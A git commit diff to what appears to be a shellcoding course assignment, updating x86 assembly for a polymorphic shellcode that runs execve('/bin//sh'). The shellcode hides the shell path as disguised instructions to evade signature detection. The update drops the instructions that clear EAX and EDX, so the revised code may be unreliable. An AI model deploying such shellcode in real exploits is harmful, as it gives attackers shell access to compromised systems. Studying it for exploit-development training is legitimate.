97ed048f82324fdea063ef5440265ba41f4733a5
amonsec <amonsec@protonmail.com>
2017-08-04 22:47:21 +0200

    Update part-1

--- assignment-6/part-1/polymorphic_shell.asm
+++ assignment-6/part-1/polymorphic_shell.asm
@@ -2,17 +2,17 @@ global _start
 
 section .text
 _start:
-	xor eax, eax
-	xor edx, edx
 	jmp short starter
+	
 pwn:
-	pop ebx                         ; EBX = /bin//sh
-	mov al, 0xb                     ; EXECVE
-	int 0x80                        ; Interruption
+	pop ebx                    ; EBX = /bin//sh
+	mov al, 0xb                ; #define __NR_execve
+	int 0x80                   ; Interruption
+
 starter:
 	call pwn
-	das                             ; /
-	bound ebp, [ecx+0x6e]           ; bin
-	das                             ; /
-	das                             ; /
-	jae short 0x69                 ; sh
+	das                        ; /
+	bound ebp, [ecx+0x6e]      ; bin
+	das                        ; /
+	das                        ; /
+	jae short 0x69             ; sh
